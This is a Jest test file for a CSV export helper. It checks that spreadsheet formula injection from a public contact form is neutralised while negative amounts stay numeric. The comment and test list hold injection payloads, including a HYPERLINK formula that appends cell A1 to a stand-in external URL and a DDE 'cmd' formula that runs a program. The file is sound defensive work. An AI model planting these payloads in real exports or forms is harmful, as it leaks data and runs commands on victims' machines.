/**
 * A money export opens as data, not as instructions.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHAT THIS PREVENTS
 *
 * Both exports built their rows by hand:
 *
 *     `"${String(cell).replace(/"/g, '""')}"`
 *
 * which is correct CSV and no defence. Excel, LibreOffice and Sheets evaluate a
 * cell whose value begins with `=`, `+`, `-` or `@` after the quotes are
 * parsed away.
 *
 * The data is not ours. `POST /api/website/forms/contact` takes NO
 * authentication — it is the public contact form on the business's own site —
 * and writes what it is handed to `crm_contacts.first_name`. So every name in a
 * money export was typed by a stranger, and a formula is shorter than a
 * surname:
 *
 *     first name:  =HYPERLINK("https://example.invalid/?x="&A1,"Invoice")
 *
 * The owner exports their orders, opens the file, and a cell of their own data
 * is one click from someone else's server. They clicked "Export".
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * AND THE FIX THAT BREAKS THE SPREADSHEET
 *
 * Prefixing everything that starts with a dangerous character turns `-500.00`
 * into text and an accountant's column stops summing. So a cell that IS a
 * number is left alone, and only a non-numeric one is neutralised.
 * ─────────────────────────────────────────────────────────────────────────────
 */

import { csvCell, toCsv, toCsvFile, CSV_BOM } from '@/lib/payments/csv';

describe('a cell a spreadsheet would evaluate', () => {
  const payloads = [
    '=HYPERLINK("https://example.invalid","click")',
    '=1+1',
    '+1+1',
    '@SUM(A1:A9)',
    '=cmd|\' /C calc\'!A0',
    '-1+1',
    '\t=1+1',
    '\r=1+1',
  ];

  for (const payload of payloads) {
    it(`neutralises ${JSON.stringify(payload)}`, () => {
      const out = csvCell(payload);

      expect(out.startsWith("'")).toBe(true);
      /* The owner's data is not altered, only prefixed: a service genuinely
         called "+VAT" must survive its own export. */
      expect(out.slice(1)).toBe(payload);
    });
  }

  it('neutralises it inside a real document too', () => {
    const csv = toCsv([['Client'], ['=1+1']]);

    expect(csv).toContain('"\'=1+1"');
    expect(csv).not.toContain('"=1+1"');
  });
});

describe('numbers are left alone, or the columns stop summing', () => {
  const numbers = ['-500.00', '-0.01', '500.00', '0', '1,250.50', '-1,250.50'];

  for (const value of numbers) {
    it(`leaves ${value} as a number`, () => {
      expect(csvCell(value)).toBe(value);
    });
  }

  it('leaves a plain negative amount summable in a document', () => {
    /*
     * The refund column carries these. Prefixed, every refund total in the
     * owner's spreadsheet would read zero and look like a reconciled book.
     */
    expect(toCsv([['Refunded'], ['-250.00']])).toContain('"-250.00"');
  });

  it('still catches a NON-number that merely starts like one', () => {
    // `-1+1` is arithmetic, not a figure.
    expect(csvCell('-1+1')).toBe("'-1+1");
  });
});

describe('ordinary text passes through', () => {
  it('leaves a name alone', () => {
    expect(csvCell('שלמה המלך')).toBe('שלמה המלך');
    expect(csvCell('Shlomo & Sons')).toBe('Shlomo & Sons');
  });

  it('escapes a quote without prefixing it', () => {
    expect(toCsv([['He said "hi"']])).toBe('"He said ""hi"""');
  });

  it('renders null and undefined as empty, not as the words', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(toCsv([[null, undefined]])).toBe('"",""');
  });

  it('keeps a comma and a newline inside their quotes', () => {
    expect(toCsv([['a,b']])).toBe('"a,b"');
    expect(toCsv([['line1\nline2']])).toBe('"line1\nline2"');
  });
});

describe('the file Excel can actually open', () => {
  it('leads with the BOM, or Hebrew arrives as mojibake', () => {
    /* The client-name column is exactly where the Hebrew is. */
    expect(toCsvFile([['שלמה']]).startsWith(CSV_BOM)).toBe(true);
  });

  it('separates rows with CRLF', () => {
    expect(toCsv([['a'], ['b']])).toBe('"a"\r\n"b"');
  });

  it('is empty rather than malformed when there is nothing to write', () => {
    expect(toCsv([])).toBe('');
  });
});
